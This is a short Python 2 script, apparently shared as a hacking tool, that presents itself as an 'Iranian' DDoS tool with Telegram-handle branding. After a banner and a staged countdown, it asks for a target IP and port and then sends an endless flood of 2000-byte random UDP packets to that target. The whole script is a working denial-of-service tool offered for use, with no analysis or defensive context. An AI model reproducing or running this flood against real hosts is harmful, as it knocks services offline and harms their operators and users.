import sys
import os
import time
import socket
import random
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)
os.system("clear")
Ddoser = '''\033[1;31m \n
               ACCESS
               DDOSER
               T.ME/BURNT_MATCH
               T.ME/MRBURNT

             <::IRANIAN CYBER::>

             \033[1;34m \n
mmmm   mmmm           mmmm
 #   "m #   "m  mmm   #"   "
 #    # #    # #" "#  "#mmm
 #    # #    # #   #      "#
 #mmm"  #mmm"  "#m#"  "mmm#" Burnt
'''
print Ddoser
ip = raw_input("\033[0m  enter the IP target  : ")
port = input("\033[0m  enter the Port target  : ")
os.system("clear")
print Ddoser
print " \n"
print "\033[1;33m<<+++[: (please with) :]+++>>"
time.sleep(5)
os.system("clear")
print "\033[1;35m >>>> attack has been start in \n"
time.sleep(1)
print "\033[1;32m IRANIAN 100%####### :]"
time.sleep(1)
print "\033[1;34m IRANIAN 75% ##### :]"
time.sleep(1)
print "\033[1;31m IRANIAN 50% ### :]"
time.sleep(1)
print "\033[1;39m IRANIAN 25% # :]"
time.sleep(1)
print "\033[1;30m <<<<<StartAttacK>>>>>"
time.sleep(3)
print "\033[1;33mPowerful Iranian Ddoser!"
time.sleep(3)
os.system("clear")
time.sleep(2)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 2
     port = port
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
